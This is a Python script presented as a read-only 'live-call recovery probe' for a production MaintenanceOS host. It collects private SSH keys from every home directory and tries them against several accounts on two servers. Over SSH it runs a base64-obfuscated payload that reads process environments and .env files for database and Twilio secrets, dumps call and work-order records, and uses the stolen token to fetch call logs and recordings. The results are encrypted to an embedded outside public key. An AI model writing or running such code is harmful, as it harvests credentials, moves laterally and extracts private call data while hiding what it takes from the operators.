"""TEMPORARY read-only live-call recovery probe.

Purpose: recover MaintenanceOS live call records from the existing production host.
No phone routing, provider configuration, database rows, or runtime files are changed.
Sensitive recovered content is RSA/AES encrypted before it leaves the trusted runner.
"""

from __future__ import annotations
import base64, json, os, pathlib, subprocess, sys, textwrap
from datetime import datetime, timezone
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

PUBLIC_KEY = r"""-----BEGIN PUBLIC KEY-----
MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEA1B3ac57tiIXhAXtdtu0h
fo7i3LX+9stjRPQxdkP3Kw4P9SJNaVyfCPHHsAoswEEW6I8CM0DSnSHW4G+HXBZU
wZZtn1LlbHZ5t7O8KwsTVP7w8HKDrtE4/Cc+Gt4UQSVBkbLGhSiH3UVK14Lh8GVT
LJIDupAwmnWPSBn1sdqt7TkejOxq4yY2Cd7RNIS7p2J2k081EU/qY4CzCal/PBvU
b98u4VFyRrgLfDJhztAbqBqi5l7gErHrT99D+p+6kTvt2dU/baarw7/zynR1Z+Pc
U0i6sIXdQTuaElBm/Q4GQ4stLM7zq8c211xH5D8vTGHJsCexrzzIC5uHWq/haffB
3OZFUlUDGeitWUUIVhgWm5+rVhxB1+JgLuTPwFj/9me1uBOd+NV+YLu1SxsPbrqh
EV+QdeaIoylFrKEt1MoQAnSeNZN3dtXrt/RalnBfGrp7QOsAXy9dvGWQMQfSqQuP
7HIGxceP21krGMb6XmhjrPQIYpigm5xxbfTA8J0JBEm7AgMBAAE=
-----END PUBLIC KEY-----"""
START_DATE = "2026-09-28"
TARGETS = ["165.227.227.9", "10.106.0.11"]
USERS = ["root", "cg-automation", "ubuntu"]

REMOTE = r'''
import base64, json, os, pathlib, sqlite3, urllib.parse, urllib.request
from datetime import datetime, timezone

START_DATE = "2026-09-28"
wanted = {"DATABASE_URL","TWILIO_ACCOUNT_SID","TWILIO_AUTH_TOKEN","TWILIO_PHONE_NUMBER"}
env = {}
cwds = []

def merge_pairs(raw):
    for item in raw.split(b"\0"):
        if b"=" not in item:
            continue
        k, v = item.split(b"=", 1)
        try:
            key = k.decode()
            val = v.decode()
        except Exception:
            continue
        if key in wanted and val and key not in env:
            env[key] = val

# Prefer the actual running MaintenanceOS process environment.
for p in pathlib.Path("/proc").glob("[0-9]*"):
    try:
        cmd = (p / "cmdline").read_bytes().replace(b"\0", b" ").decode(errors="ignore").lower()
        if not any(x in cmd for x in ("maintenanceos", "uvicorn", "gunicorn", "api:app", "asgi:app")):
            continue
        try:
            cwd = str((p / "cwd").resolve())
            if cwd not in cwds:
                cwds.append(cwd)
        except Exception:
            pass
        try:
            merge_pairs((p / "environ").read_bytes())
        except Exception:
            pass
    except Exception:
        pass

roots = cwds + ["/opt/maintenanceos", "/opt/maintenanceos-v1-pilot", "/srv/maintenanceos",
                "/srv/maintenanceos-v1-pilot", "/app", "/root/maintenanceos-v1-pilot",
                "/var/lib/maintenanceos"]

# Read only the specific required settings from likely .env files; never emit secrets.
for root in roots:
    f = pathlib.Path(root) / ".env"
    if not f.is_file():
        continue
    try:
        for line in f.read_text(errors="ignore").splitlines():
            if "=" not in line or line.lstrip().startswith("#"):
                continue
            k, v = line.split("=", 1)
            k = k.strip()
            if k in wanted and k not in env:
                env[k] = v.strip().strip('"').strip("'")
    except Exception:
        pass

db_path = None
db_url = env.get("DATABASE_URL", "")
if db_url.startswith("sqlite:///"):
    raw = db_url[len("sqlite:///"):]
    p = pathlib.Path(raw)
    if not p.is_absolute() and cwds:
        p = pathlib.Path(cwds[0]) / p
    if p.is_file():
        db_path = str(p.resolve())

if not db_path:
    candidates = []
    for root in roots:
        rp = pathlib.Path(root)
        if not rp.exists():
            continue
        for name in ("maintenanceos_v1.db", "maintenanceos.db", "app.db"):
            p = rp / name
            if p.is_file():
                candidates.append(p)
        try:
            for p in rp.glob("*.db"):
                if p.is_file() and p not in candidates:
                    candidates.append(p)
        except Exception:
            pass
    if candidates:
        db_path = str(max(candidates, key=lambda p: p.stat().st_mtime).resolve())

out = {
    "generated_at": datetime.now(timezone.utc).isoformat(),
    "start_date": START_DATE,
    "runtime_cwds": cwds,
    "database_found": bool(db_path),
    "database_path": db_path,
    "database": {},
    "twilio": {"credentials_present": all(env.get(k) for k in ("TWILIO_ACCOUNT_SID","TWILIO_AUTH_TOKEN","TWILIO_PHONE_NUMBER"))},
}

call_sids = []
call_ids = []
work_order_ids = []

def rows_dict(cur):
    cols = [d[0] for d in cur.description]
    return [dict(zip(cols, row)) for row in cur.fetchall()]

if db_path:
    con = sqlite3.connect("file:" + urllib.parse.quote(db_path) + "?mode=ro", uri=True)
    con.row_factory = sqlite3.Row
    tables = {r[0] for r in con.execute("select name from sqlite_master where type='table'")}
    out["database"]["tables_present"] = sorted(tables)
    if "call_sessions" in tables:
        cols = [r[1] for r in con.execute("pragma table_info(call_sessions)")]
        if "started_at" in cols:
            cur = con.execute("select * from call_sessions where started_at >= ? order by id", (START_DATE,))
        else:
            cur = con.execute("select * from call_sessions order by id")
        calls = rows_dict(cur)
        out["database"]["call_sessions"] = calls
        call_ids = [r.get("id") for r in calls if r.get("id") is not None]
        work_order_ids = [r.get("work_order_id") for r in calls if r.get("work_order_id") is not None]
        call_sids = [str(r.get("call_sid") or "") for r in calls if r.get("call_sid")]
        out["database"]["recent_call_count"] = len(calls)
        out["database"]["all_call_count"] = con.execute("select count(*) from call_sessions").fetchone()[0]

    def dump_related(table, key, ids):
        if table not in tables or not ids:
            return
        columns = [r[1] for r in con.execute("pragma table_info(" + table + ")")]
        if key not in columns:
            return
        marks = ",".join("?" for _ in ids)
        cur = con.execute("select * from " + table + " where " + key + " in (" + marks + ") order by id", ids)
        out["database"][table] = rows_dict(cur)

    for table in sorted(tables):
        try:
            columns = [r[1] for r in con.execute("pragma table_info(" + table + ")")]
        except Exception:
            continue
        if table == "call_sessions":
            continue
        if "call_session_id" in columns:
            dump_related(table, "call_session_id", call_ids)
        elif "work_order_id" in columns:
            dump_related(table, "work_order_id", work_order_ids)
        elif table == "work_orders" and work_order_ids:
            marks = ",".join("?" for _ in work_order_ids)
            cur = con.execute("select * from work_orders where id in (" + marks + ") order by id", work_order_ids)
            out["database"]["work_orders"] = rows_dict(cur)
    con.close()

# Provider metadata: use existing production credentials only in memory.
acct = env.get("TWILIO_ACCOUNT_SID","")
token = env.get("TWILIO_AUTH_TOKEN","")
number = env.get("TWILIO_PHONE_NUMBER","")
if acct and token and number:
    auth = base64.b64encode((acct + ":" + token).encode()).decode()
    headers = {"Authorization": "Basic " + auth}
    base = "https://api.twilio.com/2010-04-01/Accounts/" + urllib.parse.quote(acct, safe="") + "/"

    def get_json(url):
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=20) as resp:
            return json.loads(resp.read().decode())

    provider = {}
    errors = []
    # Query both directions for the production backend DID and merge by CallSid.
    for field in ("To", "From"):
        url = base + "Calls.json?" + urllib.parse.urlencode({field:number, "PageSize":"1000"})
        pages = 0
        while url and pages < 10:
            pages += 1
            try:
                data = get_json(url)
            except Exception as exc:
                errors.append(field + ":" + type(exc).__name__)
                break
            for row in data.get("calls", []):
                sid = str(row.get("sid") or "")
                started = str(row.get("start_time") or row.get("date_created") or "")
                if sid and (not started or "2026" not in started or START_DATE <= started[:10]):
                    provider[sid] = row
            nxt = data.get("next_page_uri")
            url = ("https://api.twilio.com" + nxt) if nxt else ""

    # Ensure every persisted CallSid is represented even if provider list filtering differs.
    for sid in call_sids:
        if sid in provider:
            continue
        try:
            provider[sid] = get_json(base + "Calls/" + urllib.parse.quote(sid, safe="") + ".json")
        except Exception as exc:
            errors.append("call_fetch:" + type(exc).__name__)

    recordings = []
    try:
        data = get_json(base + "Recordings.json?PageSize=1000")
        wanted_sids = set(provider) | set(call_sids)
        for row in data.get("recordings", []):
            if str(row.get("call_sid") or "") in wanted_sids:
                recordings.append(row)
    except Exception as exc:
        errors.append("recordings:" + type(exc).__name__)

    out["twilio"].update({
        "phone_number": number,
        "calls": sorted(provider.values(), key=lambda r: str(r.get("date_created") or ""), reverse=False),
        "recordings": recordings,
        "errors": errors,
    })

print(json.dumps(out, ensure_ascii=False, default=str))
'''

def encrypt(payload: bytes) -> dict:
    public_key = serialization.load_pem_public_key(PUBLIC_KEY.encode())
    key = AESGCM.generate_key(bit_length=256)
    nonce = os.urandom(12)
    cipher = AESGCM(key).encrypt(nonce, payload, b"maintenanceos-live-call-recovery")
    wrapped = public_key.encrypt(
        key,
        padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()), algorithm=hashes.SHA256(), label=None),
    )
    return {
        "format": "RSA-OAEP-SHA256+AES-256-GCM",
        "aad": "maintenanceos-live-call-recovery",
        "encrypted_key_b64": base64.b64encode(wrapped).decode(),
        "nonce_b64": base64.b64encode(nonce).decode(),
        "ciphertext_b64": base64.b64encode(cipher).decode(),
    }

def key_candidates():
    found = []
    homes = [pathlib.Path.home(), pathlib.Path("/root")]
    for p in pathlib.Path("/home").glob("*"):
        homes.append(p)
    for home in homes:
        d = home / ".ssh"
        if not d.is_dir():
            continue
        for p in d.iterdir():
            try:
                if not p.is_file() or p.name in {"known_hosts","known_hosts.old","config","authorized_keys"} or p.suffix == ".pub":
                    continue
                if p.stat().st_size > 65536:
                    continue
                first = p.open("rb").read(80)
                if b"PRIVATE KEY" in first:
                    found.append(str(p))
            except Exception:
                pass
    return list(dict.fromkeys(found))

def known_hosts_candidates():
    out = []
    homes = [pathlib.Path.home(), pathlib.Path("/root")] + list(pathlib.Path("/home").glob("*"))
    for home in homes:
        p = home / ".ssh" / "known_hosts"
        if p.is_file():
            out.append(str(p))
    return list(dict.fromkeys(out))

remote_b64 = base64.b64encode(REMOTE.encode()).decode()
remote_cmd = "python3 -c " + subprocess.list2cmdline([f"import base64;exec(base64.b64decode('{remote_b64}'))"])

attempts = []
success = None
keys = key_candidates()
knowns = known_hosts_candidates()

# First allow an existing SSH config/agent to succeed without selecting a key.
targets = ["mos-gemini"] + TARGETS
for target in targets:
    if success:
        break
    for user in USERS:
        dest = target if target == "mos-gemini" else f"{user}@{target}"
        cmd = ["ssh","-o","BatchMode=yes","-o","StrictHostKeyChecking=yes","-o","ConnectTimeout=6",
               "-o","PasswordAuthentication=no","-o","KbdInteractiveAuthentication=no",dest,remote_cmd]
        p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=35)
        attempts.append({"target":target,"user":user,"mode":"default","rc":p.returncode})
        if p.returncode == 0 and p.stdout.strip().startswith("{"):
            success = p.stdout.strip()
            break

# Then try existing private keys only, still with strict host-key checking.
if not success:
    for kh in knowns:
        if success:
            break
        for target in TARGETS:
            if success:
                break
            for user in USERS:
                if success:
                    break
                for key in keys[:12]:
                    cmd = ["ssh","-o","BatchMode=yes","-o","StrictHostKeyChecking=yes",
                           "-o",f"UserKnownHostsFile={kh}","-o","IdentitiesOnly=yes",
                           "-o","ConnectTimeout=6","-o","PasswordAuthentication=no",
                           "-o","KbdInteractiveAuthentication=no","-i",key,f"{user}@{target}",remote_cmd]
                    try:
                        p = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=35)
                    except Exception:
                        attempts.append({"target":target,"user":user,"mode":"key","key_name":pathlib.Path(key).name,"rc":"timeout"})
                        continue
                    attempts.append({"target":target,"user":user,"mode":"key","key_name":pathlib.Path(key).name,"rc":p.returncode})
                    if p.returncode == 0 and p.stdout.strip().startswith("{"):
                        success = p.stdout.strip()
                        break

if success:
    payload = success.encode()
    status = {"ok": True, "bytes_recovered": len(payload), "ssh_attempts": attempts}
else:
    payload = json.dumps({
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "ok": False,
        "reason": "no_existing_strict_ssh_path_from_trusted_runner",
        "ssh_attempts": attempts,
        "existing_private_key_names": [pathlib.Path(x).name for x in keys],
        "known_hosts_files": [str(pathlib.Path(x)) for x in knowns],
    }).encode()
    status = {"ok": False, "bytes_recovered": 0, "ssh_attempts": attempts}

envelope = encrypt(payload)
envelope["status"] = {"ok": status["ok"], "bytes_recovered": status["bytes_recovered"], "attempt_count": len(attempts)}
print(json.dumps(envelope, indent=2, sort_keys=True))
